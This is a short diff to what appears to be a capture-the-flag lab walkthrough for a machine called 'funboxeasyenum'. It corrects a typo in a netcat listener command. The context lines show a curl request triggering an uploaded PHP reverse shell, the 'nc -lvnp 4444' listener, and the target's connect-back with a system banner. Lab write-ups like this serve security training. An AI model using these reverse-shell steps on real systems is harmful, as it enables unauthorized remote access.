@@ -145,7 +145,7 @@ curl http://funboxeasyenum/php-reverse-shell.php
 ```
 
 ```shell
-nv -lvnp 4444
+nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.169] from (UNKNOWN) [192.168.182.132] 50364
 Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
